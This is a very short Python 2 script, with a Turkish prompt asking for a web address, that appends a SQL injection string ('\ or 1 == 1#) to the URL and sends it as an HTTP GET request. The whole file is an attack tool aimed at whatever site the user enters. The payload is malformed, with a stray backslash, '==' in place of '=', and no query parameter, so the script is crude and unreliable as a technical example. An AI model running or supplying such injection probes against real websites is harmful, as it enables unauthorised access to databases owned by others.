import sys
import requests

url = raw_input("Web adresini girin : ")

sqli = "'\ or 1 == 1# "

req = requests.get("http://" + url + sqli)

data = req.text
